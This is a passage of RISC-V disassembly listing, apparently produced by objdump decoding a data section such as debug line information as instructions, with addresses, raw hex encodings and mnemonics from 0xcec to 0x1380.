     cec:	0104                	addi	s1,sp,128
     cee:	02090003          	lb	zero,32(s2)
     cf2:	0100                	addi	s0,sp,128
     cf4:	2805                	addiw	a6,a6,1
     cf6:	0200                	addi	s0,sp,256
     cf8:	0104                	addi	s1,sp,128
     cfa:	10090003          	lb	zero,256(s2)
     cfe:	0100                	addi	s0,sp,128
     d00:	1205                	addi	tp,tp,-31
     d02:	0200                	addi	s0,sp,256
     d04:	0104                	addi	s1,sp,128
     d06:	10090003          	lb	zero,256(s2)
     d0a:	0100                	addi	s0,sp,128
     d0c:	0c05                	addi	s8,s8,1
     d0e:	06090103          	lb	sp,96(s2)
     d12:	0100                	addi	s0,sp,128
     d14:	0a05                	addi	s4,s4,1
     d16:	06090103          	lb	sp,96(s2)
     d1a:	0100                	addi	s0,sp,128
     d1c:	0105                	addi	sp,sp,1
     d1e:	02090103          	lb	sp,32(s2)
     d22:	0100                	addi	s0,sp,128
     d24:	08090303          	lb	t1,128(s2)
     d28:	0100                	addi	s0,sp,128
     d2a:	0305                	addi	t1,t1,1
     d2c:	0c090503          	lb	a0,192(s2)
     d30:	0100                	addi	s0,sp,128
     d32:	1105                	addi	sp,sp,-31
     d34:	04090203          	lb	tp,64(s2)
     d38:	0100                	addi	s0,sp,128
     d3a:	0f05                	addi	t5,t5,1
     d3c:	10090003          	lb	zero,256(s2)
     d40:	0100                	addi	s0,sp,128
     d42:	0705                	addi	a4,a4,1
     d44:	04090103          	lb	sp,64(s2)
     d48:	0100                	addi	s0,sp,128
     d4a:	3005                	0x3005
     d4c:	1a090003          	lb	zero,416(s2)
     d50:	0100                	addi	s0,sp,128
     d52:	0605                	addi	a2,a2,1
     d54:	08090003          	lb	zero,128(s2)
     d58:	0100                	addi	s0,sp,128
     d5a:	0b05                	addi	s6,s6,1
     d5c:	04090203          	lb	tp,64(s2)
     d60:	0100                	addi	s0,sp,128
     d62:	0c090103          	lb	sp,192(s2)
     d66:	0100                	addi	s0,sp,128
     d68:	0d05                	addi	s10,s10,1
     d6a:	10090203          	lb	tp,256(s2)
     d6e:	0100                	addi	s0,sp,128
     d70:	1405                	addi	s0,s0,-31
     d72:	0200                	addi	s0,sp,256
     d74:	0104                	addi	s1,sp,128
     d76:	02090003          	lb	zero,32(s2)
     d7a:	0100                	addi	s0,sp,128
     d7c:	0d05                	addi	s10,s10,1
     d7e:	0200                	addi	s0,sp,256
     d80:	0104                	addi	s1,sp,128
     d82:	12090003          	lb	zero,288(s2)
     d86:	0100                	addi	s0,sp,128
     d88:	0305                	addi	t1,t1,1
     d8a:	04090303          	lb	t1,64(s2)
     d8e:	0100                	addi	s0,sp,128
     d90:	0105                	addi	sp,sp,1
     d92:	04090103          	lb	sp,64(s2)
     d96:	0100                	addi	s0,sp,128
     d98:	08090303          	lb	t1,128(s2)
     d9c:	0100                	addi	s0,sp,128
     d9e:	1a05                	addi	s4,s4,-31
     da0:	0a090103          	lb	sp,160(s2)
     da4:	0100                	addi	s0,sp,128
     da6:	1505                	addi	a0,a0,-31
     da8:	08090003          	lb	zero,128(s2)
     dac:	0100                	addi	s0,sp,128
     dae:	0c05                	addi	s8,s8,1
     db0:	06090003          	lb	zero,96(s2)
     db4:	0100                	addi	s0,sp,128
     db6:	0d05                	addi	s10,s10,1
     db8:	06090103          	lb	sp,96(s2)
     dbc:	0100                	addi	s0,sp,128
     dbe:	1a05                	addi	s4,s4,-31
     dc0:	08090003          	lb	zero,128(s2)
     dc4:	0100                	addi	s0,sp,128
     dc6:	1305                	addi	t1,t1,-31
     dc8:	06090003          	lb	zero,96(s2)
     dcc:	0100                	addi	s0,sp,128
     dce:	0105                	addi	sp,sp,1
     dd0:	02090103          	lb	sp,32(s2)
     dd4:	0100                	addi	s0,sp,128
     dd6:	0204                	addi	s1,sp,256
     dd8:	097f9d03          	lh	s10,151(t6)
     ddc:	0008                	0x8
     dde:	0501                	addi	a0,a0,0
     de0:	0310                	addi	a2,sp,384
     de2:	0902                	slli	s2,s2,0x0
     de4:	002e                	c.slli	zero,0xb
     de6:	0301                	addi	t1,t1,0
     de8:	0901                	addi	s2,s2,0
     dea:	0006                	c.slli	zero,0x1
     dec:	0301                	addi	t1,t1,0
     dee:	0901                	addi	s2,s2,0
     df0:	0006                	c.slli	zero,0x1
     df2:	0301                	addi	t1,t1,0
     df4:	0901                	addi	s2,s2,0
     df6:	0006                	c.slli	zero,0x1
     df8:	0501                	addi	a0,a0,0
     dfa:	09010303          	lb	t1,144(sp) # 50b01de <_tbss_end+0x50b015a>
     dfe:	0006                	c.slli	zero,0x1
     e00:	0501                	addi	a0,a0,0
     e02:	030c                	addi	a1,sp,384
     e04:	0902                	slli	s2,s2,0x0
     e06:	0004                	0x4
     e08:	0501                	addi	a0,a0,0
     e0a:	030a                	slli	t1,t1,0x2
     e0c:	0900                	addi	s0,sp,144
     e0e:	0002                	c.slli	zero,0x0
     e10:	0501                	addi	a0,a0,0
     e12:	0309                	addi	t1,t1,2
     e14:	0901                	addi	s2,s2,0
     e16:	000a                	c.slli	zero,0x2
     e18:	0501                	addi	a0,a0,0
     e1a:	04020013          	addi	zero,tp,64 # ffffffffffff8040 <_end+0xffffffff7ffdcb80>
     e1e:	0301                	addi	t1,t1,0
     e20:	0900                	addi	s0,sp,144
     e22:	0002                	c.slli	zero,0x0
     e24:	0501                	addi	a0,a0,0
     e26:	0009                	c.nop	2
     e28:	0402                	slli	s0,s0,0x0
     e2a:	0301                	addi	t1,t1,0
     e2c:	0900                	addi	s0,sp,144
     e2e:	000a                	c.slli	zero,0x2
     e30:	0501                	addi	a0,a0,0
     e32:	030c                	addi	a1,sp,384
     e34:	0902                	slli	s2,s2,0x0
     e36:	0002                	c.slli	zero,0x0
     e38:	0501                	addi	a0,a0,0
     e3a:	09020303          	lb	t1,144(tp) # 90 <_tbss_end+0xc>
     e3e:	000c                	0xc
     e40:	0501                	addi	a0,a0,0
     e42:	09010313          	addi	t1,sp,144
     e46:	0004                	0x4
     e48:	0501                	addi	a0,a0,0
     e4a:	0301                	addi	t1,t1,0
     e4c:	0901                	addi	s2,s2,0
     e4e:	0002                	c.slli	zero,0x0
     e50:	0301                	addi	t1,t1,0
     e52:	00080907          	0x80907
     e56:	0501                	addi	a0,a0,0
     e58:	09010307          	0x9010307
     e5c:	000c                	0xc
     e5e:	0501                	addi	a0,a0,0
     e60:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
     e64:	0301                	addi	t1,t1,0
     e66:	0908                	addi	a0,sp,144
     e68:	0004                	0x4
     e6a:	0001                	nop
     e6c:	0402                	slli	s0,s0,0x0
     e6e:	0602                	slli	a2,a2,0x0
     e70:	0e090003          	lb	zero,224(s2)
     e74:	0100                	addi	s0,sp,128
     e76:	0200                	addi	s0,sp,256
     e78:	0304                	addi	s1,sp,384
     e7a:	18090003          	lb	zero,384(s2)
     e7e:	0100                	addi	s0,sp,128
     e80:	0200                	addi	s0,sp,256
     e82:	0504                	addi	s1,sp,640
     e84:	38090003          	lb	zero,896(s2)
     e88:	0100                	addi	s0,sp,128
     e8a:	0200                	addi	s0,sp,256
     e8c:	0104                	addi	s1,sp,128
     e8e:	0306                	slli	t1,t1,0x1
     e90:	0901                	addi	s2,s2,0
     e92:	001e                	c.slli	zero,0x7
     e94:	0001                	nop
     e96:	0402                	slli	s0,s0,0x0
     e98:	0602                	slli	a2,a2,0x0
     e9a:	0e090003          	lb	zero,224(s2)
     e9e:	0100                	addi	s0,sp,128
     ea0:	0200                	addi	s0,sp,256
     ea2:	0304                	addi	s1,sp,384
     ea4:	18090003          	lb	zero,384(s2)
     ea8:	0100                	addi	s0,sp,128
     eaa:	0200                	addi	s0,sp,256
     eac:	0504                	addi	s1,sp,640
     eae:	38090003          	lb	zero,896(s2)
     eb2:	0100                	addi	s0,sp,128
     eb4:	0105                	addi	sp,sp,1
     eb6:	0200                	addi	s0,sp,256
     eb8:	0504                	addi	s1,sp,640
     eba:	0306                	slli	t1,t1,0x1
     ebc:	001e0903          	lb	s2,1(t3) # 1a001 <_tbss_end+0x19f7d>
     ec0:	0301                	addi	t1,t1,0
     ec2:	00080903          	lb	s2,0(a6)
     ec6:	0501                	addi	a0,a0,0
     ec8:	0312                	slli	t1,t1,0x4
     eca:	0901                	addi	s2,s2,0
     ecc:	000a                	c.slli	zero,0x2
     ece:	0501                	addi	a0,a0,0
     ed0:	0318                	addi	a4,sp,384
     ed2:	0900                	addi	s0,sp,144
     ed4:	0006                	c.slli	zero,0x1
     ed6:	0501                	addi	a0,a0,0
     ed8:	030a                	slli	t1,t1,0x2
     eda:	0900                	addi	s0,sp,144
     edc:	0004                	0x4
     ede:	0501                	addi	a0,a0,0
     ee0:	0009                	c.nop	2
     ee2:	0402                	slli	s0,s0,0x0
     ee4:	0301                	addi	t1,t1,0
     ee6:	0901                	addi	s2,s2,0
     ee8:	000a                	c.slli	zero,0x2
     eea:	0501                	addi	a0,a0,0
     eec:	0301                	addi	t1,t1,0
     eee:	0904                	addi	s1,sp,144
     ef0:	0002                	c.slli	zero,0x0
     ef2:	0501                	addi	a0,a0,0
     ef4:	09010303          	lb	t1,144(sp)
     ef8:	0014                	0x14
     efa:	0501                	addi	a0,a0,0
     efc:	0301                	addi	t1,t1,0
     efe:	0904                	addi	s1,sp,144
     f00:	0008                	0x8
     f02:	0501                	addi	a0,a0,0
     f04:	09010303          	lb	t1,144(sp)
     f08:	000e                	c.slli	zero,0x3
     f0a:	0501                	addi	a0,a0,0
     f0c:	0301                	addi	t1,t1,0
     f0e:	0904                	addi	s1,sp,144
     f10:	000a                	c.slli	zero,0x2
     f12:	0501                	addi	a0,a0,0
     f14:	09010303          	lb	t1,144(sp)
     f18:	0008                	0x8
     f1a:	0501                	addi	a0,a0,0
     f1c:	0301                	addi	t1,t1,0
     f1e:	0904                	addi	s1,sp,144
     f20:	0008                	0x8
     f22:	0501                	addi	a0,a0,0
     f24:	09010303          	lb	t1,144(sp)
     f28:	000e                	c.slli	zero,0x3
     f2a:	0501                	addi	a0,a0,0
     f2c:	0301                	addi	t1,t1,0
     f2e:	0901                	addi	s2,s2,0
     f30:	001c                	0x1c
     f32:	0301                	addi	t1,t1,0
     f34:	000c0903          	lb	s2,0(s8) # 1d000 <_tbss_end+0x1cf7c>
     f38:	0501                	addi	a0,a0,0
     f3a:	0009                	c.nop	2
     f3c:	0402                	slli	s0,s0,0x0
     f3e:	0301                	addi	t1,t1,0
     f40:	00140903          	lb	s2,1(s0) # ffffffffffffd001 <_end+0xffffffff7ffe1b41>
     f44:	0501                	addi	a0,a0,0
     f46:	0301                	addi	t1,t1,0
     f48:	0901                	addi	s2,s2,0
     f4a:	0008                	0x8
     f4c:	0301                	addi	t1,t1,0
     f4e:	000a0903          	lb	s2,0(s4)
     f52:	0501                	addi	a0,a0,0
     f54:	09020303          	lb	t1,144(tp) # 90 <_tbss_end+0xc>
     f58:	0012                	c.slli	zero,0x4
     f5a:	0501                	addi	a0,a0,0
     f5c:	030a                	slli	t1,t1,0x2
     f5e:	0901                	addi	s2,s2,0
     f60:	000c                	0xc
     f62:	0501                	addi	a0,a0,0
     f64:	0301                	addi	t1,t1,0
     f66:	0901                	addi	s2,s2,0
     f68:	0002                	c.slli	zero,0x0
     f6a:	0301                	addi	t1,t1,0
     f6c:	000a0903          	lb	s2,0(s4)
     f70:	0501                	addi	a0,a0,0
     f72:	09040323          	sb	a6,134(s0)
     f76:	0008                	0x8
     f78:	0501                	addi	a0,a0,0
     f7a:	030a                	slli	t1,t1,0x2
     f7c:	0900                	addi	s0,sp,144
     f7e:	000c                	0xc
     f80:	0501                	addi	a0,a0,0
     f82:	09010303          	lb	t1,144(sp)
     f86:	0004                	0x4
     f88:	0501                	addi	a0,a0,0
     f8a:	0321                	addi	t1,t1,8
     f8c:	0901                	addi	s2,s2,0
     f8e:	0014                	0x14
     f90:	0501                	addi	a0,a0,0
     f92:	030a                	slli	t1,t1,0x2
     f94:	0900                	addi	s0,sp,144
     f96:	000c                	0xc
     f98:	0501                	addi	a0,a0,0
     f9a:	09010303          	lb	t1,144(sp)
     f9e:	0004                	0x4
     fa0:	0501                	addi	a0,a0,0
     fa2:	0301                	addi	t1,t1,0
     fa4:	0901                	addi	s2,s2,0
     fa6:	0014                	0x14
     fa8:	0301                	addi	t1,t1,0
     faa:	000a0903          	lb	s2,0(s4)
     fae:	0501                	addi	a0,a0,0
     fb0:	09010303          	lb	t1,144(sp)
     fb4:	0032                	c.slli	zero,0xc
     fb6:	0301                	addi	t1,t1,0
     fb8:	0901                	addi	s2,s2,0
     fba:	0004                	0x4
     fbc:	0501                	addi	a0,a0,0
     fbe:	030d                	addi	t1,t1,3
     fc0:	00100903          	lb	s2,1(zero) # 1 <_tdata_begin+0x1>
     fc4:	0501                	addi	a0,a0,0
     fc6:	0309                	addi	t1,t1,2
     fc8:	000e0903          	lb	s2,0(t3)
     fcc:	0501                	addi	a0,a0,0
     fce:	030c                	addi	a1,sp,384
     fd0:	0901                	addi	s2,s2,0
     fd2:	0004                	0x4
     fd4:	0501                	addi	a0,a0,0
     fd6:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     fda:	0004                	0x4
     fdc:	0501                	addi	a0,a0,0
     fde:	0311                	addi	t1,t1,4
     fe0:	0901                	addi	s2,s2,0
     fe2:	0002                	c.slli	zero,0x0
     fe4:	0501                	addi	a0,a0,0
     fe6:	0308                	addi	a0,sp,384
     fe8:	0900                	addi	s0,sp,144
     fea:	0012                	c.slli	zero,0x4
     fec:	0501                	addi	a0,a0,0
     fee:	0901030f          	0x901030f
     ff2:	0002                	c.slli	zero,0x0
     ff4:	0501                	addi	a0,a0,0
     ff6:	030c                	addi	a1,sp,384
     ff8:	0900                	addi	s0,sp,144
     ffa:	003a                	c.slli	zero,0xe
     ffc:	0501                	addi	a0,a0,0
     ffe:	0026                	c.slli	zero,0x9
    1000:	0402                	slli	s0,s0,0x0
    1002:	0302                	slli	t1,t1,0x0
    1004:	097e                	slli	s2,s2,0x1f
    1006:	000a                	c.slli	zero,0x2
    1008:	0501                	addi	a0,a0,0
    100a:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
    100e:	0301                	addi	t1,t1,0
    1010:	0900                	addi	s0,sp,144
    1012:	000a                	c.slli	zero,0x2
    1014:	0501                	addi	a0,a0,0
    1016:	0306                	slli	t1,t1,0x1
    1018:	000e0903          	lb	s2,0(t3)
    101c:	0501                	addi	a0,a0,0
    101e:	0305                	addi	t1,t1,1
    1020:	0901                	addi	s2,s2,0
    1022:	0008                	0x8
    1024:	0501                	addi	a0,a0,0
    1026:	09020303          	lb	t1,144(tp) # 90 <_tbss_end+0xc>
    102a:	0006                	c.slli	zero,0x1
    102c:	0501                	addi	a0,a0,0
    102e:	0301                	addi	t1,t1,0
    1030:	0905                	addi	s2,s2,1
    1032:	000a                	c.slli	zero,0x2
    1034:	0501                	addi	a0,a0,0
    1036:	030d                	addi	t1,t1,3
    1038:	0904                	addi	s1,sp,144
    103a:	000e                	c.slli	zero,0x3
    103c:	0501                	addi	a0,a0,0
    103e:	0311                	addi	t1,t1,4
    1040:	0900                	addi	s0,sp,144
    1042:	0010                	0x10
    1044:	0501                	addi	a0,a0,0
    1046:	0306                	slli	t1,t1,0x1
    1048:	0902                	slli	s2,s2,0x0
    104a:	0012                	c.slli	zero,0x4
    104c:	0501                	addi	a0,a0,0
    104e:	001c                	0x1c
    1050:	0402                	slli	s0,s0,0x0
    1052:	0301                	addi	t1,t1,0
    1054:	0900                	addi	s0,sp,144
    1056:	000e                	c.slli	zero,0x3
    1058:	0501                	addi	a0,a0,0
    105a:	0012                	c.slli	zero,0x4
    105c:	0402                	slli	s0,s0,0x0
    105e:	0301                	addi	t1,t1,0
    1060:	0900                	addi	s0,sp,144
    1062:	0004                	0x4
    1064:	0501                	addi	a0,a0,0
    1066:	0305                	addi	t1,t1,1
    1068:	0902                	slli	s2,s2,0x0
    106a:	000a                	c.slli	zero,0x2
    106c:	0501                	addi	a0,a0,0
    106e:	030c                	addi	a1,sp,384
    1070:	0901                	addi	s2,s2,0
    1072:	0016                	c.slli	zero,0x5
    1074:	0501                	addi	a0,a0,0
    1076:	030a                	slli	t1,t1,0x2
    1078:	00040903          	lb	s2,0(s0)
    107c:	0501                	addi	a0,a0,0
    107e:	0301                	addi	t1,t1,0
    1080:	0901                	addi	s2,s2,0
    1082:	0002                	c.slli	zero,0x0
    1084:	0301                	addi	t1,t1,0
    1086:	000a0903          	lb	s2,0(s4)
    108a:	0501                	addi	a0,a0,0
    108c:	030a                	slli	t1,t1,0x2
    108e:	000c0903          	lb	s2,0(s8)
    1092:	0501                	addi	a0,a0,0
    1094:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
    1098:	0004                	0x4
    109a:	0501                	addi	a0,a0,0
    109c:	0314                	addi	a3,sp,384
    109e:	0902                	slli	s2,s2,0x0
    10a0:	0002                	c.slli	zero,0x0
    10a2:	0501                	addi	a0,a0,0
    10a4:	0321                	addi	t1,t1,8
    10a6:	0900                	addi	s0,sp,144
    10a8:	000e                	c.slli	zero,0x3
    10aa:	0501                	addi	a0,a0,0
    10ac:	0900031b          	addiw	t1,zero,144
    10b0:	0008                	0x8
    10b2:	0001                	nop
    10b4:	0402                	slli	s0,s0,0x0
    10b6:	0601                	addi	a2,a2,0
    10b8:	06090003          	lb	zero,96(s2)
    10bc:	0100                	addi	s0,sp,128
    10be:	0200                	addi	s0,sp,256
    10c0:	0204                	addi	s1,sp,256
    10c2:	06090003          	lb	zero,96(s2)
    10c6:	0100                	addi	s0,sp,128
    10c8:	0b05                	addi	s6,s6,1
    10ca:	0200                	addi	s0,sp,256
    10cc:	0404                	addi	s1,sp,512
    10ce:	0306                	slli	t1,t1,0x1
    10d0:	0900                	addi	s0,sp,144
    10d2:	0004                	0x4
    10d4:	0501                	addi	a0,a0,0
    10d6:	0402001b          	addiw	zero,tp,64
    10da:	0304                	addi	s1,sp,384
    10dc:	0900                	addi	s0,sp,144
    10de:	000c                	0xc
    10e0:	0501                	addi	a0,a0,0
    10e2:	0402000f          	0x402000f
    10e6:	0304                	addi	s1,sp,384
    10e8:	0900                	addi	s0,sp,144
    10ea:	0006                	c.slli	zero,0x1
    10ec:	0501                	addi	a0,a0,0
    10ee:	04020007          	0x4020007
    10f2:	0304                	addi	s1,sp,384
    10f4:	0901                	addi	s2,s2,0
    10f6:	000a                	c.slli	zero,0x2
    10f8:	0501                	addi	a0,a0,0
    10fa:	0018                	0x18
    10fc:	0402                	slli	s0,s0,0x0
    10fe:	0304                	addi	s1,sp,384
    1100:	097d                	addi	s2,s2,31
    1102:	000a                	c.slli	zero,0x2
    1104:	0501                	addi	a0,a0,0
    1106:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
    110a:	0302                	slli	t1,t1,0x0
    110c:	0900                	addi	s0,sp,144
    110e:	000a                	c.slli	zero,0x2
    1110:	0501                	addi	a0,a0,0
    1112:	0905030b          	0x905030b
    1116:	000e                	c.slli	zero,0x3
    1118:	0501                	addi	a0,a0,0
    111a:	09020303          	lb	t1,144(tp) # 90 <_tbss_end+0xc>
    111e:	0004                	0x4
    1120:	0501                	addi	a0,a0,0
    1122:	0301                	addi	t1,t1,0
    1124:	0901                	addi	s2,s2,0
    1126:	000a                	c.slli	zero,0x2
    1128:	0301                	addi	t1,t1,0
    112a:	0904                	addi	s1,sp,144
    112c:	000a                	c.slli	zero,0x2
    112e:	0501                	addi	a0,a0,0
    1130:	09020307          	0x9020307
    1134:	002c                	addi	a1,sp,8
    1136:	0501                	addi	a0,a0,0
    1138:	09040317          	auipc	t1,0x9040
    113c:	0004                	0x4
    113e:	0501                	addi	a0,a0,0
    1140:	030d                	addi	t1,t1,3
    1142:	0900                	addi	s0,sp,144
    1144:	000c                	0xc
    1146:	0501                	addi	a0,a0,0
    1148:	0311                	addi	t1,t1,4
    114a:	0900                	addi	s0,sp,144
    114c:	000c                	0xc
    114e:	0501                	addi	a0,a0,0
    1150:	030d                	addi	t1,t1,3
    1152:	0901                	addi	s2,s2,0
    1154:	0010                	0x10
    1156:	0501                	addi	a0,a0,0
    1158:	0308                	addi	a0,sp,384
    115a:	0900                	addi	s0,sp,144
    115c:	0004                	0x4
    115e:	0501                	addi	a0,a0,0
    1160:	0309                	addi	t1,t1,2
    1162:	0902                	slli	s2,s2,0x0
    1164:	0008                	0x8
    1166:	0501                	addi	a0,a0,0
    1168:	0311                	addi	t1,t1,4
    116a:	097d                	addi	s2,s2,31
    116c:	0010                	0x10
    116e:	0501                	addi	a0,a0,0
    1170:	09020307          	0x9020307
    1174:	0002                	c.slli	zero,0x0
    1176:	0501                	addi	a0,a0,0
    1178:	0309                	addi	t1,t1,2
    117a:	0904                	addi	s1,sp,144
    117c:	0002                	c.slli	zero,0x0
    117e:	0501                	addi	a0,a0,0
    1180:	0305                	addi	t1,t1,1
    1182:	0901                	addi	s2,s2,0
    1184:	0002                	c.slli	zero,0x0
    1186:	0501                	addi	a0,a0,0
    1188:	097f030f          	0x97f030f
    118c:	0010                	0x10
    118e:	0501                	addi	a0,a0,0
    1190:	0309                	addi	t1,t1,2
    1192:	0900                	addi	s0,sp,144
    1194:	000c                	0xc
    1196:	0301                	addi	t1,t1,0
    1198:	000a0903          	lb	s2,0(s4)
    119c:	0501                	addi	a0,a0,0
    119e:	0901030f          	0x901030f
    11a2:	0002                	c.slli	zero,0x0
    11a4:	0501                	addi	a0,a0,0
    11a6:	031c                	addi	a5,sp,384
    11a8:	0900                	addi	s0,sp,144
    11aa:	0010                	0x10
    11ac:	0501                	addi	a0,a0,0
    11ae:	09000333          	0x9000333
    11b2:	0010                	0x10
    11b4:	0001                	nop
    11b6:	0402                	slli	s0,s0,0x0
    11b8:	0601                	addi	a2,a2,0
    11ba:	08090003          	lb	zero,128(s2)
    11be:	0100                	addi	s0,sp,128
    11c0:	0200                	addi	s0,sp,256
    11c2:	0204                	addi	s1,sp,256
    11c4:	06090003          	lb	zero,96(s2)
    11c8:	0100                	addi	s0,sp,128
    11ca:	1505                	addi	a0,a0,-31
    11cc:	0200                	addi	s0,sp,256
    11ce:	0404                	addi	s1,sp,512
    11d0:	0306                	slli	t1,t1,0x1
    11d2:	0900                	addi	s0,sp,144
    11d4:	0004                	0x4
    11d6:	0501                	addi	a0,a0,0
    11d8:	0005                	c.nop	1
    11da:	0402                	slli	s0,s0,0x0
    11dc:	0304                	addi	s1,sp,384
    11de:	0900                	addi	s0,sp,144
    11e0:	0004                	0x4
    11e2:	0501                	addi	a0,a0,0
    11e4:	030d                	addi	t1,t1,3
    11e6:	097f                	0x97f
    11e8:	000e                	c.slli	zero,0x3
    11ea:	0501                	addi	a0,a0,0
    11ec:	0309                	addi	t1,t1,2
    11ee:	0900                	addi	s0,sp,144
    11f0:	000c                	0xc
    11f2:	0501                	addi	a0,a0,0
    11f4:	0301                	addi	t1,t1,0
    11f6:	0902                	slli	s2,s2,0x0
    11f8:	0004                	0x4
    11fa:	0301                	addi	t1,t1,0
    11fc:	000c0903          	lb	s2,0(s8)
    1200:	0501                	addi	a0,a0,0
    1202:	0306                	slli	t1,t1,0x1
    1204:	0901                	addi	s2,s2,0
    1206:	0010                	0x10
    1208:	0501                	addi	a0,a0,0
    120a:	030c                	addi	a1,sp,384
    120c:	0901                	addi	s2,s2,0
    120e:	000e                	c.slli	zero,0x3
    1210:	0501                	addi	a0,a0,0
    1212:	0901030b          	0x901030b
    1216:	0014                	0x14
    1218:	0501                	addi	a0,a0,0
    121a:	030c                	addi	a1,sp,384
    121c:	0901                	addi	s2,s2,0
    121e:	0008                	0x8
    1220:	0301                	addi	t1,t1,0
    1222:	0902                	slli	s2,s2,0x0
    1224:	0014                	0x14
    1226:	0501                	addi	a0,a0,0
    1228:	0301                	addi	t1,t1,0
    122a:	0901                	addi	s2,s2,0
    122c:	0016                	c.slli	zero,0x5
    122e:	0301                	addi	t1,t1,0
    1230:	00080903          	lb	s2,0(a6)
    1234:	0501                	addi	a0,a0,0
    1236:	0306                	slli	t1,t1,0x1
    1238:	0901                	addi	s2,s2,0
    123a:	0010                	0x10
    123c:	0501                	addi	a0,a0,0
    123e:	030c                	addi	a1,sp,384
    1240:	0901                	addi	s2,s2,0
    1242:	000e                	c.slli	zero,0x3
    1244:	0501                	addi	a0,a0,0
    1246:	0901030b          	0x901030b
    124a:	0014                	0x14
    124c:	0501                	addi	a0,a0,0
    124e:	030c                	addi	a1,sp,384
    1250:	0901                	addi	s2,s2,0
    1252:	0008                	0x8
    1254:	0301                	addi	t1,t1,0
    1256:	0902                	slli	s2,s2,0x0
    1258:	0014                	0x14
    125a:	0501                	addi	a0,a0,0
    125c:	0301                	addi	t1,t1,0
    125e:	0901                	addi	s2,s2,0
    1260:	0012                	c.slli	zero,0x4
    1262:	0301                	addi	t1,t1,0
    1264:	00080903          	lb	s2,0(a6)
    1268:	0501                	addi	a0,a0,0
    126a:	0909030b          	0x909030b
    126e:	001c                	0x1c
    1270:	0501                	addi	a0,a0,0
    1272:	030a                	slli	t1,t1,0x2
    1274:	0901                	addi	s2,s2,0
    1276:	0002                	c.slli	zero,0x0
    1278:	0301                	addi	t1,t1,0
    127a:	0902                	slli	s2,s2,0x0
    127c:	0004                	0x4
    127e:	0501                	addi	a0,a0,0
    1280:	09010307          	0x9010307
    1284:	000a                	c.slli	zero,0x2
    1286:	0501                	addi	a0,a0,0
    1288:	0312                	slli	t1,t1,0x4
    128a:	097c                	addi	a5,sp,156
    128c:	000c                	0xc
    128e:	0501                	addi	a0,a0,0
    1290:	0310                	addi	a2,sp,384
    1292:	0900                	addi	s0,sp,144
    1294:	0008                	0x8
    1296:	0501                	addi	a0,a0,0
    1298:	0900030b          	0x900030b
    129c:	0004                	0x4
    129e:	0501                	addi	a0,a0,0
    12a0:	0308                	addi	a0,sp,384
    12a2:	0906                	slli	s2,s2,0x1
    12a4:	000a                	c.slli	zero,0x2
    12a6:	0501                	addi	a0,a0,0
    12a8:	030e                	slli	t1,t1,0x3
    12aa:	000a0903          	lb	s2,0(s4)
    12ae:	0501                	addi	a0,a0,0
    12b0:	030a                	slli	t1,t1,0x2
    12b2:	0901                	addi	s2,s2,0
    12b4:	0008                	0x8
    12b6:	0501                	addi	a0,a0,0
    12b8:	0901030b          	0x901030b
    12bc:	0008                	0x8
    12be:	0501                	addi	a0,a0,0
    12c0:	0901030f          	0x901030f
    12c4:	0006                	c.slli	zero,0x1
    12c6:	0501                	addi	a0,a0,0
    12c8:	0901030b          	0x901030b
    12cc:	0006                	c.slli	zero,0x1
    12ce:	0501                	addi	a0,a0,0
    12d0:	030d                	addi	t1,t1,3
    12d2:	0901                	addi	s2,s2,0
    12d4:	0004                	0x4
    12d6:	0501                	addi	a0,a0,0
    12d8:	09020313          	addi	t1,tp,144 # 90 <_tbss_end+0xc>
    12dc:	0004                	0x4
    12de:	0501                	addi	a0,a0,0
    12e0:	0312                	slli	t1,t1,0x4
    12e2:	0900                	addi	s0,sp,144
    12e4:	000c                	0xc
    12e6:	0501                	addi	a0,a0,0
    12e8:	0310                	addi	a2,sp,384
    12ea:	0900                	addi	s0,sp,144
    12ec:	0004                	0x4
    12ee:	0501                	addi	a0,a0,0
    12f0:	030c                	addi	a1,sp,384
    12f2:	0904                	addi	s1,sp,144
    12f4:	003a                	c.slli	zero,0xe
    12f6:	0501                	addi	a0,a0,0
    12f8:	09010307          	0x9010307
    12fc:	0008                	0x8
    12fe:	0501                	addi	a0,a0,0
    1300:	030c                	addi	a1,sp,384
    1302:	0904                	addi	s1,sp,144
    1304:	0002                	c.slli	zero,0x0
    1306:	0501                	addi	a0,a0,0
    1308:	09010307          	0x9010307
    130c:	0008                	0x8
    130e:	0501                	addi	a0,a0,0
    1310:	0316                	slli	t1,t1,0x5
    1312:	090c                	addi	a1,sp,144
    1314:	0002                	c.slli	zero,0x0
    1316:	0501                	addi	a0,a0,0
    1318:	031f 0901 0004      	0x40901031f
    131e:	0501                	addi	a0,a0,0
    1320:	0324                	addi	s1,sp,392
    1322:	0900                	addi	s0,sp,144
    1324:	0012                	c.slli	zero,0x4
    1326:	0501                	addi	a0,a0,0
    1328:	09000313          	li	t1,144
    132c:	0004                	0x4
    132e:	0501                	addi	a0,a0,0
    1330:	030e                	slli	t1,t1,0x3
    1332:	0901                	addi	s2,s2,0
    1334:	0008                	0x8
    1336:	0501                	addi	a0,a0,0
    1338:	030c                	addi	a1,sp,384
    133a:	0900                	addi	s0,sp,144
    133c:	0008                	0x8
    133e:	0301                	addi	t1,t1,0
    1340:	0901                	addi	s2,s2,0
    1342:	0004                	0x4
    1344:	0501                	addi	a0,a0,0
    1346:	0016                	c.slli	zero,0x5
    1348:	0402                	slli	s0,s0,0x0
    134a:	0301                	addi	t1,t1,0
    134c:	0900                	addi	s0,sp,144
    134e:	000a                	c.slli	zero,0x2
    1350:	0501                	addi	a0,a0,0
    1352:	031d                	addi	t1,t1,7
    1354:	097d                	addi	s2,s2,31
    1356:	000a                	c.slli	zero,0x2
    1358:	0501                	addi	a0,a0,0
    135a:	09010313          	addi	t1,sp,144
    135e:	000a                	c.slli	zero,0x2
    1360:	0501                	addi	a0,a0,0
    1362:	0311                	addi	t1,t1,4
    1364:	0908                	addi	a0,sp,144
    1366:	0002                	c.slli	zero,0x0
    1368:	0501                	addi	a0,a0,0
    136a:	09010307          	0x9010307
    136e:	0012                	c.slli	zero,0x4
    1370:	0501                	addi	a0,a0,0
    1372:	030a                	slli	t1,t1,0x2
    1374:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
    1378:	0501                	addi	a0,a0,0
    137a:	0901030f          	0x901030f
    137e:	000a                	c.slli	zero,0x2
    1380:	0501                	addi	a0,a0,0
